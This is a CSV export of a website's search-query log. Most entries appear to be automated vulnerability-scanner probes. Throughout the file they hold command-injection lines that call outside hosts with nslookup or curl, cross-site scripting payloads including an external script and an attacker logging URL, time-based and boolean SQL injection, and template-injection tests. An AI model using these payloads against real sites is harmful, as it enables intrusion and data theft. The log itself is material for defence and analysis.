query_text,num_results,popularity,updated_at
"&nslookup -q=cname hithyuvcejskoc03ec.bxss.me&'\""`0&nslookup -q=cname hithyuvcejskoc03ec.bxss.me&`'",0,1,2024-06-10 16:12:52
"&(nslookup -q=cname hitilmcqufmwif0d20.bxss.me||curl hitilmcqufmwif0d20.bxss.me)&'\""`0&(nslookup -q=cname hitilmcqufmwif0d20.bxs",0,1,2024-06-10 16:12:54
"'""()&%<zzz><ScRiPt >F0Cb(9018)</ScRiPt>",0,1,2024-06-10 16:12:56
test9797370,0,1,2024-06-10 16:12:57
|(nslookup -q=cname hitkwyztepxzpdde81.bxss.me||curl hitkwyztepxzpdde81.bxss.me),0,1,2024-06-10 16:12:58
test9797370<,0,1,2024-06-10 16:12:59
`(nslookup -q=cname hitsqaqgguqwp6dc7c.bxss.me||curl hitsqaqgguqwp6dc7c.bxss.me)`,0,1,2024-06-10 16:12:59
;(nslookup -q=cname hitwkqydpowcsc005d.bxss.me||curl hitwkqydpowcsc005d.bxss.me)|(nslookup -q=cname hitwkqydpowcsc005d.bxss.me||,0,1,2024-06-10 16:13:01
bfg8661＜s1﹥s2ʺs3ʹhjl8661,0,1,2024-06-10 16:13:03
bfgx8425??z1??z2a?bcxhjl8425,0,1,2024-06-10 16:13:07
test'&&sleep(27*1000)*upwjrv&&',0,1,2024-06-10 16:13:09
"test""&&sleep(27*1000)*tzhotc&&""",0,1,2024-06-10 16:13:11
'.gethostbyname(lc('hitpa'.'ibsponesab69a.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(101).chr(90).chr(102).chr(76).',0,1,2024-06-10 16:13:13
test'||sleep(27*1000)*skpclr||',9,1,2024-06-10 16:13:15
""".gethostbyname(lc(""hitjh"".""opnpthas2ff85.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(120).chr(73).chr(97).chr(68).""",0,1,2024-06-10 16:13:17
"test""||sleep(27*1000)*nfftjb||""",13,1,2024-06-10 16:13:19
bfg9695＜s1﹥s2ʺs3ʹhjl9695,0,1,2024-06-10 16:13:25
bfgx10153??z1??z2a?bcxhjl10153,0,1,2024-06-10 16:13:27
bfg4969＜s1﹥s2ʺs3ʹhjl4969,0,1,2024-06-10 16:13:48
bfgx9618??z1??z2a?bcxhjl9618,0,1,2024-06-10 16:13:49
bfg4337＜s1﹥s2ʺs3ʹhjl4337,0,1,2024-06-10 16:14:12
bfgx10857??z1??z2a?bcxhjl10857,0,1,2024-06-10 16:14:17
testj4WyniA9,0,1,2024-06-10 16:14:22
bfg4191＜s1﹥s2ʺs3ʹhjl4191,0,1,2024-06-10 16:14:32
bfgx9900??z1??z2a?bcxhjl9900,0,1,2024-06-10 16:14:36
bfg2234＜s1﹥s2ʺs3ʹhjl2234,0,1,2024-06-10 16:14:58
bfgx3063??z1??z2a?bcxhjl3063,0,1,2024-06-10 16:15:00
test' AND 2*3*8=6*8 AND 'zyF3'='zyF3,0,1,2024-06-10 16:15:09
"test"" AND 2*3*8=6*8 AND ""1ByM""=""1ByM",0,1,2024-06-10 16:15:10
test%' AND 2*3*8=6*8 AND 'zXSm'!='zXSm%,0,1,2024-06-10 16:15:12
-1 OR 2+400-400-1=0+0+0+1,0,1,2024-06-10 16:15:14
-1 OR 3+400-400-1=0+0+0+1,0,1,2024-06-10 16:15:15
test</title><ScRiPt >F0Cb(9952)</ScRiPt>,0,1,2024-06-10 16:15:22
"test9166""();}]9746",0,1,2024-06-10 16:15:25
%74%65%73%74%39%33%38%33%22%28%29%3B%7D%5D%39%39%38%35,0,1,2024-06-10 16:15:28
test</script><script>F0Cb(9513)</script>,0,1,2024-06-10 16:15:30
"test""onmouseover=F0Cb(92872)""",0,1,2024-06-10 16:15:31
"test""onmouseover=F0Cb(97882)""",0,1,2024-06-10 16:15:32
"test"" D102=F0Cb([!+!]) afY=""",0,1,2024-06-10 16:15:36
test\u0022onmouseover=F0Cb(94883)\u0022,0,1,2024-06-10 16:15:38
%74%65%73%74%22%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%46%30%43%62%28%39%38%36%38%34%29%22,0,1,2024-06-10 16:15:39
"?""onmouseover=F0Cb(98925)//",0,1,2024-06-10 16:15:41
"test""sTYLe='zzz:Expre/**/SSion(F0Cb(9084))'bad=""",0,1,2024-06-10 16:15:44
"test""><script>F0Cb(9204)</script>",0,1,2024-06-10 16:15:45
test<ScRiPt >F0Cb(9807)</ScRiPt>,0,1,2024-06-10 16:15:47
test<WNHY2A>8KAXA[!+!]</WNHY2A>,0,1,2024-06-10 16:15:48
test<script>F0Cb(9382)</script>,0,1,2024-06-10 16:15:51
test<script>F0Cb(9423)</script>9423,0,1,2024-06-10 16:15:56
test<ScR<ScRiPt>IpT>F0Cb(9383)</sCr<ScRiPt>IpT>,0,1,2024-06-10 16:16:00
"test<ScRiPt 
>F0Cb(9471)</ScRiPt>",0,1,2024-06-10 16:16:02
test<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9793></ScRiPt>,0,1,2024-06-10 16:16:05
"test< ScRiPt 
>F0Cb(9848)</ScRiPt>",0,1,2024-06-10 16:16:09
"test<svg	
? onload=F0Cb(9749);>",0,1,2024-06-10 16:16:10
test<isindex type=image src=1 onerror=F0Cb(9902)>,0,1,2024-06-10 16:16:12
"test<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9495'>",0,1,2024-06-10 16:16:13
test<body onload=F0Cb(9092)>,0,1,2024-06-10 16:16:15
test<img src=//xss.bxss.me/t/dot.gif onload=F0Cb(9557)>,0,1,2024-06-10 16:16:18
test<img src=xyz OnErRor=F0Cb(9766)>,0,1,2024-06-10 16:16:21
"test<img/src="">"" onerror=alert(9180)>",0,1,2024-06-10 16:16:23
%74%65%73%74%3C%53%63%52%69%50%74%20%3E%46%30%43%62%289904%29%3C%2F%73%43%72%69%70%54%3E,0,1,2024-06-10 16:16:25
test\u003CScRiPt\F0Cb(9072)\u003C/sCripT\u003E,0,1,2024-06-10 16:16:26
test&lt;ScRiPt&gt;F0Cb(9371)&lt;/sCripT&gt;,0,1,2024-06-10 16:16:29
?<img zzz onmouseover=F0Cb(90821) //?>,0,1,2024-06-10 16:16:30
test<input autofocus onfocus=F0Cb(9457)>,0,1,2024-06-10 16:16:32
test}body{zzz:Expre/**/SSion(F0Cb(9846))},0,1,2024-06-10 16:16:39
"test2feQo
<ScRiPt >F0Cb(9025)</ScRiPt>",0,1,2024-06-10 16:16:40
test<W9XTE6>T5ABZ[!+!]</W9XTE6>,0,1,2024-06-10 16:16:42
test<ifRAme sRc=9956.com></IfRamE>,0,1,2024-06-10 16:16:44
test<a1U2agF x=9511>,0,1,2024-06-10 16:16:45
test<img sRc='http://attacker-9608/log.php?,0,1,2024-06-10 16:16:47
test<acJ4mho<,0,1,2024-06-10 16:16:51
testDGIYzZuR'; waitfor delay '0:0:15' --,0,1,2024-06-10 16:18:26
testqA6zggwT' OR 897=(SELECT 897 FROM PG_SLEEP(15))--,0,1,2024-06-10 16:18:52
testW1yT2ngU') OR 352=(SELECT 352 FROM PG_SLEEP(15))--,0,1,2024-06-10 16:19:23
test7zskB8zI')) OR 471=(SELECT 471 FROM PG_SLEEP(15))--,0,1,2024-06-10 16:19:53
@@QtfHF,0,1,2024-06-10 16:20:31
{{35738*35738}},0,2,2024-06-10 19:32:38
${10000321+10000336},0,1,2024-06-10 19:32:43
"echo vwmyov$()\ roadea\nz^xyu||a #' &echo vwmyov$()\ roadea\nz^xyu||a #|"" &echo vwmyov$()\ roadea\nz^xyu||a #",0,1,2024-06-10 19:32:53
"&echo arvbqy$()\ bxplfh\nz^xyu||a #' &echo arvbqy$()\ bxplfh\nz^xyu||a #|"" &echo arvbqy$()\ bxplfh\nz^xyu||a #",0,1,2024-06-10 19:32:55
"test&echo zbnfow$()\ dmaryh\nz^xyu||a #' &echo zbnfow$()\ dmaryh\nz^xyu||a #|"" &echo zbnfow$()\ dmaryh\nz^xyu||a #",0,1,2024-06-10 19:32:57
response.write(9347737*9661272),0,1,2024-06-10 19:32:58
"|echo vbkwwp$()\ shssdk\nz^xyu||a #' |echo vbkwwp$()\ shssdk\nz^xyu||a #|"" |echo vbkwwp$()\ shssdk\nz^xyu||a #",0,1,2024-06-10 19:33:00
'+response.write(9347737*9661272)+',0,1,2024-06-10 19:33:00
"""+response.write(9347737*9661272)+""",0,1,2024-06-10 19:33:03
"test|echo ybtglu$()\ gclmob\nz^xyu||a #' |echo ybtglu$()\ gclmob\nz^xyu||a #|"" |echo ybtglu$()\ gclmob\nz^xyu||a #",0,1,2024-06-10 19:33:06
970498,0,1,2024-06-10 19:33:10
(nslookup -q=cname hitxzcuoymfocdc3a1.bxss.me||curl hitxzcuoymfocdc3a1.bxss.me)),0,1,2024-06-10 19:33:10
"""+""A"".concat(70-3).concat(22*4).concat(120).concat(90).concat(120).concat(73)+(require""socket""
Socket.gethostbyname(""hitqd""+""ioq",0,1,2024-06-10 19:33:11
$(nslookup -q=cname hithmpaydxxcq979cc.bxss.me||curl hithmpaydxxcq979cc.bxss.me),0,1,2024-06-10 19:33:13
"&nslookup -q=cname hitufnxmwanxbe896a.bxss.me&'\""`0&nslookup -q=cname hitufnxmwanxbe896a.bxss.me&`'",0,1,2024-06-10 19:33:17
"'+'A'.concat(70-3).concat(22*4).concat(97).concat(88).concat(116).concat(80)+(require'socket'
Socket.gethostbyname('hitfd'+'uyxr",0,1,2024-06-10 19:33:19
"test'""()&%<zzz><ScRiPt >oxJc(9906)</ScRiPt>",0,1,2024-06-10 19:33:19
"'""()&%<zzz><ScRiPt >oxJc(9336)</ScRiPt>",0,1,2024-06-10 19:33:22
"&(nslookup -q=cname hitcvjsywacxfbe4a2.bxss.me||curl hitcvjsywacxfbe4a2.bxss.me)&'\""`0&(nslookup -q=cname hitcvjsywacxfbe4a2.bxs",0,1,2024-06-10 19:33:26
test9550038,0,1,2024-06-10 19:33:26
'.gethostbyname(lc('hitzv'.'dvfncmhea1469.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(98).chr(69).chr(122).chr(75).',0,1,2024-06-10 19:33:27
|(nslookup -q=cname hitdganzrdqwn58c49.bxss.me||curl hitdganzrdqwn58c49.bxss.me),0,1,2024-06-10 19:33:29
""".gethostbyname(lc(""hitkr"".""mvivutjd81ce8.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(117).chr(69).chr(121).chr(68).""",0,1,2024-06-10 19:33:29
test9550038<,0,1,2024-06-10 19:33:29
`(nslookup -q=cname hitxeychaoddy11a04.bxss.me||curl hitxeychaoddy11a04.bxss.me)`,0,1,2024-06-10 19:33:31
bfg4800＜s1﹥s2ʺs3ʹhjl4800,0,1,2024-06-10 19:33:34
;(nslookup -q=cname hitjtxzmzhtfb81146.bxss.me||curl hitjtxzmzhtfb81146.bxss.me)|(nslookup -q=cname hitjtxzmzhtfb81146.bxss.me||,0,1,2024-06-10 19:33:35
bfgx3365??z1??z2a?bcxhjl3365,0,1,2024-06-10 19:33:37
test'&&sleep(27*1000)*teujfm&&',0,1,2024-06-10 19:33:43
"test""&&sleep(27*1000)*fhbglw&&""",0,1,2024-06-10 19:33:47
test'||sleep(27*1000)*srjqxv||',9,1,2024-06-10 19:33:52
"test""||sleep(27*1000)*akqbqp||""",13,1,2024-06-10 19:33:54
bfg4946＜s1﹥s2ʺs3ʹhjl4946,0,1,2024-06-10 19:34:11
bfgx6501??z1??z2a?bcxhjl6501,0,1,2024-06-10 19:34:16
bfg9416＜s1﹥s2ʺs3ʹhjl9416,0,1,2024-06-10 19:34:44
bfgx5891??z1??z2a?bcxhjl5891,0,1,2024-06-10 19:34:50
bfg4788＜s1﹥s2ʺs3ʹhjl4788,0,1,2024-06-10 19:35:24
bfgx8175??z1??z2a?bcxhjl8175,0,1,2024-06-10 19:35:26
testKyYabO7d,0,1,2024-06-10 19:36:00
bfg3316＜s1﹥s2ʺs3ʹhjl3316,0,1,2024-06-10 19:36:01
bfgx7168??z1??z2a?bcxhjl7168,0,1,2024-06-10 19:36:10
bfg1966＜s1﹥s2ʺs3ʹhjl1966,0,1,2024-06-10 19:36:51
bfgx4986??z1??z2a?bcxhjl4986,0,1,2024-06-10 19:36:54
test</title><ScRiPt >oxJc(9403)</ScRiPt>,0,1,2024-06-10 19:37:55
"test9636""();}]9706",0,1,2024-06-10 19:37:59
test' AND 2*3*8=6*8 AND 'K2vi'='K2vi,0,1,2024-06-10 19:38:00
%74%65%73%74%39%38%35%33%22%28%29%3B%7D%5D%39%32%37%31,0,1,2024-06-10 19:38:02
"test"" AND 2*3*8=6*8 AND ""oGUO""=""oGUO",0,1,2024-06-10 19:38:03
test</script><script>oxJc(9120)</script>,0,1,2024-06-10 19:38:05
"test""onmouseover=oxJc(95142)""",0,1,2024-06-10 19:38:08
"test""onmouseover=oxJc(96112)""",0,1,2024-06-10 19:38:12
"test"" eorL=oxJc([!+!]) Wcz=""",0,1,2024-06-10 19:38:15
test%' AND 2*3*8=6*8 AND 'f9GD'!='f9GD%,0,1,2024-06-10 19:38:15
-1 OR 2+577-577-1=0+0+0+1,0,1,2024-06-10 19:38:18
test\u0022onmouseover=oxJc(97223)\u0022,0,1,2024-06-10 19:38:19
-1 OR 3+577-577-1=0+0+0+1,0,1,2024-06-10 19:38:22
%74%65%73%74%22%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%6F%78%4A%63%28%39%30%31%32%34%29%22,0,1,2024-06-10 19:38:23
"?""onmouseover=oxJc(94325)//",0,1,2024-06-10 19:38:26
"test""sTYLe='zzz:Expre/**/SSion(oxJc(9006))'bad=""",0,1,2024-06-10 19:38:32
"test""><script>oxJc(9153)</script>",0,1,2024-06-10 19:38:35
test<ScRiPt >oxJc(9921)</ScRiPt>,0,1,2024-06-10 19:38:41
test<WS7BQZ>UZC4F[!+!]</WS7BQZ>,0,1,2024-06-10 19:38:43
test<script>oxJc(9964)</script>,0,1,2024-06-10 19:38:46
test<script>oxJc(9823)</script>9823,0,1,2024-06-10 19:38:49
test<ScR<ScRiPt>IpT>oxJc(9367)</sCr<ScRiPt>IpT>,0,1,2024-06-10 19:38:56
"test<ScRiPt 
>oxJc(9306)</ScRiPt>",0,1,2024-06-10 19:38:58
test<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9199></ScRiPt>,0,1,2024-06-10 19:39:01
"test< ScRiPt 
>oxJc(9246)</ScRiPt>",0,1,2024-06-10 19:39:05
"test<svg	
? onload=oxJc(9570);>",0,1,2024-06-10 19:39:16
test<isindex type=image src=1 onerror=oxJc(9336)>,0,1,2024-06-10 19:39:19
"test<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9470'>",0,1,2024-06-10 19:39:23
test<body onload=oxJc(9146)>,0,1,2024-06-10 19:39:26
test<img src=//xss.bxss.me/t/dot.gif onload=oxJc(9224)>,0,1,2024-06-10 19:39:29
test<img src=xyz OnErRor=oxJc(9361)>,0,1,2024-06-10 19:39:33
"test<img/src="">"" onerror=alert(9948)>",0,1,2024-06-10 19:39:54
%74%65%73%74%3C%53%63%52%69%50%74%20%3E%6F%78%4A%63%289544%29%3C%2F%73%43%72%69%70%54%3E,0,1,2024-06-10 19:40:03
test\u003CScRiPt\oxJc(9878)\u003C/sCripT\u003E,0,1,2024-06-10 19:40:07
test&lt;ScRiPt&gt;oxJc(9288)&lt;/sCripT&gt;,0,1,2024-06-10 19:40:11
?<img zzz onmouseover=oxJc(97091) //?>,0,1,2024-06-10 19:40:14
test<input autofocus onfocus=oxJc(9830)>,0,1,2024-06-10 19:40:18
test}body{zzz:Expre/**/SSion(oxJc(9527))},0,1,2024-06-10 19:40:30
"testkm4bP
<ScRiPt >oxJc(9198)</ScRiPt>",0,1,2024-06-10 19:40:32
test<WYKQ4A>AUKJF[!+!]</WYKQ4A>,0,1,2024-06-10 19:40:38
test<ifRAme sRc=9843.com></IfRamE>,0,1,2024-06-10 19:40:42
test<aBjUaLi x=9430>,0,1,2024-06-10 19:40:46
test<img sRc='http://attacker-9774/log.php?,0,1,2024-06-10 19:40:49
test<anl3Q8A<,0,1,2024-06-10 19:40:52
testmuXslT1L'; waitfor delay '0:0:15' --,0,1,2024-06-10 19:46:06
testksUGc7lH' OR 316=(SELECT 316 FROM PG_SLEEP(15))--,0,1,2024-06-10 19:47:03
testvlS4VBrl') OR 596=(SELECT 596 FROM PG_SLEEP(15))--,0,1,2024-06-10 19:47:58
testhxrVRPPg')) OR 687=(SELECT 687 FROM PG_SLEEP(15))--,0,1,2024-06-10 19:48:49
@@KdMGn,0,1,2024-06-10 19:49:44
1CszYrdNttO,0,1,2024-06-10 20:07:42
undefined,0,16,2024-06-12 02:48:24
${9999146+9999924},0,1,2024-06-10 20:14:03
{{15701*15701}},0,2,2024-06-10 20:14:26
response.write(9357890*9049030),0,1,2024-06-10 20:15:22
'+response.write(9357890*9049030)+',0,1,2024-06-10 20:15:26
"""+response.write(9357890*9049030)+""",0,1,2024-06-10 20:15:29
"""+""A"".concat(70-3).concat(22*4).concat(98).concat(73).concat(111).concat(68)+(require""socket""
Socket.gethostbyname(""hityg""+""uxpr",0,1,2024-06-10 20:15:52
"'+'A'.concat(70-3).concat(22*4).concat(115).concat(67).concat(101).concat(75)+(require'socket'
Socket.gethostbyname('hittu'+'hab",0,1,2024-06-10 20:15:55
'.gethostbyname(lc('hitak'.'lzyzpxjyb3998.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(118).chr(79).chr(114).chr(83).',0,1,2024-06-10 20:16:14
""".gethostbyname(lc(""hitoi"".""gtszdaav9d3e7.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(101).chr(75).chr(110).chr(73).""",0,1,2024-06-10 20:16:19
"echo hvjewz$()\ xnqush\nz^xyu||a #' &echo hvjewz$()\ xnqush\nz^xyu||a #|"" &echo hvjewz$()\ xnqush\nz^xyu||a #",0,1,2024-06-10 20:16:34
"&echo lhklob$()\ wasula\nz^xyu||a #' &echo lhklob$()\ wasula\nz^xyu||a #|"" &echo lhklob$()\ wasula\nz^xyu||a #",0,1,2024-06-10 20:16:36
"test&echo rleikl$()\ dtycec\nz^xyu||a #' &echo rleikl$()\ dtycec\nz^xyu||a #|"" &echo rleikl$()\ dtycec\nz^xyu||a #",0,1,2024-06-10 20:16:39
"|echo ayccks$()\ mhmbrl\nz^xyu||a #' |echo ayccks$()\ mhmbrl\nz^xyu||a #|"" |echo ayccks$()\ mhmbrl\nz^xyu||a #",0,1,2024-06-10 20:16:41
"test|echo ietjrs$()\ dvlmvu\nz^xyu||a #' |echo ietjrs$()\ dvlmvu\nz^xyu||a #|"" |echo ietjrs$()\ dvlmvu\nz^xyu||a #",0,1,2024-06-10 20:16:45
(nslookup -q=cname hitojfetcgomqdb32b.bxss.me||curl hitojfetcgomqdb32b.bxss.me)),0,1,2024-06-10 20:16:48
999742,0,1,2024-06-10 20:16:49
$(nslookup -q=cname hitsprcdmaupi14ffd.bxss.me||curl hitsprcdmaupi14ffd.bxss.me),0,1,2024-06-10 20:16:51
"&nslookup -q=cname hitbaanssqcms1c2f4.bxss.me&'\""`0&nslookup -q=cname hitbaanssqcms1c2f4.bxss.me&`'",0,1,2024-06-10 20:16:55
"&(nslookup -q=cname hitfmjxsyjttm69e7d.bxss.me||curl hitfmjxsyjttm69e7d.bxss.me)&'\""`0&(nslookup -q=cname hitfmjxsyjttm69e7d.bxs",0,1,2024-06-10 20:17:00
|(nslookup -q=cname hitnzttqvsahbbdba1.bxss.me||curl hitnzttqvsahbbdba1.bxss.me),0,1,2024-06-10 20:17:02
`(nslookup -q=cname hitczcgqhkwul60836.bxss.me||curl hitczcgqhkwul60836.bxss.me)`,0,1,2024-06-10 20:17:07
;(nslookup -q=cname hitmkelwvsohx12db1.bxss.me||curl hitmkelwvsohx12db1.bxss.me)|(nslookup -q=cname hitmkelwvsohx12db1.bxss.me||,0,1,2024-06-10 20:17:09
test'&&sleep(27*1000)*xcilso&&',0,1,2024-06-10 20:17:21
"test""&&sleep(27*1000)*hvlweq&&""",0,1,2024-06-10 20:17:23
test'||sleep(27*1000)*ppkqos||',9,1,2024-06-10 20:17:28
"test""||sleep(27*1000)*sarpeo||""",13,1,2024-06-10 20:17:32
"test'""()&%<zzz><ScRiPt >U4I5(9536)</ScRiPt>",0,1,2024-06-10 20:25:56
"'""()&%<zzz><ScRiPt >U4I5(9658)</ScRiPt>",0,1,2024-06-10 20:26:00
test9923401,0,1,2024-06-10 20:26:09
test9923401<,0,1,2024-06-10 20:26:12
bfg3008＜s1﹥s2ʺs3ʹhjl3008,0,1,2024-06-10 20:26:15
bfgx7852??z1??z2a?bcxhjl7852,0,1,2024-06-10 20:26:18
test</title><ScRiPt >U4I5(9519)</ScRiPt>,0,1,2024-06-10 20:26:45
testWsTdFqoX,0,1,2024-06-10 20:58:42
test' AND 2*3*8=6*8 AND '6OPw'='6OPw,0,1,2024-06-10 20:59:30
"test"" AND 2*3*8=6*8 AND ""MvbU""=""MvbU",0,1,2024-06-10 20:59:32
test%' AND 2*3*8=6*8 AND '2i7V'!='2i7V%,0,1,2024-06-10 20:59:35
-1 OR 2+433-433-1=0+0+0+1,0,1,2024-06-10 20:59:38
-1 OR 3+433-433-1=0+0+0+1,0,1,2024-06-10 20:59:40
testVtprsd18'; waitfor delay '0:0:15' --,0,1,2024-06-10 21:05:18
testfDLboh5v' OR 695=(SELECT 695 FROM PG_SLEEP(15))--,0,1,2024-06-10 21:06:37
testHBPjaUNz') OR 295=(SELECT 295 FROM PG_SLEEP(15))--,0,1,2024-06-10 21:07:52
testpotlCbWY')) OR 433=(SELECT 433 FROM PG_SLEEP(15))--,0,1,2024-06-10 21:08:52
@@S7UXQ,0,1,2024-06-10 21:10:00
1CgTii59dQO,0,1,2024-06-11 04:19:15
${9999169+9999778},0,1,2024-06-11 04:19:23
{{5021*5021}},0,2,2024-06-11 04:20:17
response.write(9385579*9033100),0,1,2024-06-11 04:21:39
'+response.write(9385579*9033100)+',0,1,2024-06-11 04:22:12
"""+response.write(9385579*9033100)+""",0,1,2024-06-11 04:22:19
"""+""A"".concat(70-3).concat(22*4).concat(108).concat(65).concat(113).concat(90)+(require""socket""
Socket.gethostbyname(""hitdu""+""exu",0,1,2024-06-11 04:22:55
"'+'A'.concat(70-3).concat(22*4).concat(115).concat(75).concat(111).concat(89)+(require'socket'
Socket.gethostbyname('hitmv'+'vhs",0,1,2024-06-11 04:23:12
974225,0,1,2024-06-11 04:23:36
'.gethostbyname(lc('hitut'.'dgjwlbqg48ded.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(104).chr(81).chr(98).chr(67).',0,1,2024-06-11 04:23:54
""".gethostbyname(lc(""hitdv"".""jinnckeoab942.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(119).chr(80).chr(119).chr(78).""",0,1,2024-06-11 04:24:10
"echo yckhhz$()\ qclhgu\nz^xyu||a #' &echo yckhhz$()\ qclhgu\nz^xyu||a #|"" &echo yckhhz$()\ qclhgu\nz^xyu||a #",0,1,2024-06-11 04:24:30
"&echo ekzbzq$()\ cmnlsf\nz^xyu||a #' &echo ekzbzq$()\ cmnlsf\nz^xyu||a #|"" &echo ekzbzq$()\ cmnlsf\nz^xyu||a #",0,1,2024-06-11 04:24:35
"test&echo ncrins$()\ karhxl\nz^xyu||a #' &echo ncrins$()\ karhxl\nz^xyu||a #|"" &echo ncrins$()\ karhxl\nz^xyu||a #",0,1,2024-06-11 04:24:38
"|echo mqnojm$()\ dmdaqp\nz^xyu||a #' |echo mqnojm$()\ dmdaqp\nz^xyu||a #|"" |echo mqnojm$()\ dmdaqp\nz^xyu||a #",0,1,2024-06-11 04:24:42
"test|echo josedj$()\ sxciew\nz^xyu||a #' |echo josedj$()\ sxciew\nz^xyu||a #|"" |echo josedj$()\ sxciew\nz^xyu||a #",0,1,2024-06-11 04:24:47
(nslookup -q=cname hitlcrtdexphd660ff.bxss.me||curl hitlcrtdexphd660ff.bxss.me)),0,1,2024-06-11 04:24:53
$(nslookup -q=cname hithobxekllxz8e7f6.bxss.me||curl hithobxekllxz8e7f6.bxss.me),0,1,2024-06-11 04:24:57
"&nslookup -q=cname hithhyuoyawsbfb0ca.bxss.me&'\""`0&nslookup -q=cname hithhyuoyawsbfb0ca.bxss.me&`'",0,1,2024-06-11 04:25:02
"&(nslookup -q=cname hitpzenjwwjmz45e90.bxss.me||curl hitpzenjwwjmz45e90.bxss.me)&'\""`0&(nslookup -q=cname hitpzenjwwjmz45e90.bxs",0,1,2024-06-11 04:25:12
|(nslookup -q=cname hitwwjomyxwsw69b6c.bxss.me||curl hitwwjomyxwsw69b6c.bxss.me),0,1,2024-06-11 04:25:16
`(nslookup -q=cname hiteltpzojeayaa397.bxss.me||curl hiteltpzojeayaa397.bxss.me)`,0,1,2024-06-11 04:25:19
;(nslookup -q=cname hitouocuxxhbz937ff.bxss.me||curl hitouocuxxhbz937ff.bxss.me)|(nslookup -q=cname hitouocuxxhbz937ff.bxss.me||,0,1,2024-06-11 04:25:24
test'&&sleep(27*1000)*nbgbau&&',0,1,2024-06-11 04:26:05
"test""&&sleep(27*1000)*jqhsxr&&""",0,1,2024-06-11 04:26:08
test'||sleep(27*1000)*tupnmb||',8,1,2024-06-11 04:26:26
"test""||sleep(27*1000)*hnptbd||""",8,1,2024-06-11 04:26:30
"test'""()&%<zzz><ScRiPt >YavH(9930)</ScRiPt>",0,1,2024-06-11 04:37:17
"'""()&%<zzz><ScRiPt >YavH(9983)</ScRiPt>",0,1,2024-06-11 04:37:23
test9742769,0,1,2024-06-11 04:37:27
test9742769<,0,1,2024-06-11 04:37:36
bfg3103＜s1﹥s2ʺs3ʹhjl3103,0,1,2024-06-11 04:37:38
bfgx6299??z1??z2a?bcxhjl6299,0,1,2024-06-11 04:37:42
test</title><ScRiPt >YavH(9120)</ScRiPt>,0,1,2024-06-11 04:38:23
testSLviCniM'; waitfor delay '0:0:15' --,0,1,2024-06-11 05:16:00
testTCLyetir' OR 416=(SELECT 416 FROM PG_SLEEP(15))--,0,1,2024-06-11 05:16:49
testm87ljwZL') OR 993=(SELECT 993 FROM PG_SLEEP(15))--,0,1,2024-06-11 05:17:47
test1RpGcQP8')) OR 429=(SELECT 429 FROM PG_SLEEP(15))--,0,1,2024-06-11 05:18:48
@@hO0tE,0,1,2024-06-11 05:20:15
e,0,113,2024-06-12 02:59:16
{{37843*37843}},0,2,2024-06-11 06:10:09
1DNFh8G7ApO,0,1,2024-06-11 09:03:33
${9999238+9999509},0,1,2024-06-11 09:03:37
{{44422*44422}},0,2,2024-06-11 09:04:47
response.write(9756182*9851164),0,1,2024-06-11 09:05:37
'+response.write(9756182*9851164)+',0,1,2024-06-11 09:05:54
"""+response.write(9756182*9851164)+""",0,1,2024-06-11 09:05:59
"""+""A"".concat(70-3).concat(22*4).concat(117).concat(69).concat(113).concat(65)+(require""socket""
Socket.gethostbyname(""hitmi""+""ncx",0,1,2024-06-11 09:06:22
"'+'A'.concat(70-3).concat(22*4).concat(98).concat(66).concat(104).concat(79)+(require'socket'
Socket.gethostbyname('hitqu'+'gvjq",0,1,2024-06-11 09:06:33
953847,0,1,2024-06-11 09:07:45
'.gethostbyname(lc('hittm'.'pnnjkdtf9981a.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(107).chr(80).chr(121).chr(86).',0,1,2024-06-11 09:08:07
""".gethostbyname(lc(""hitts"".""jufpuluk9a96c.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(109).chr(68).chr(98).chr(90).""",0,1,2024-06-11 09:08:10
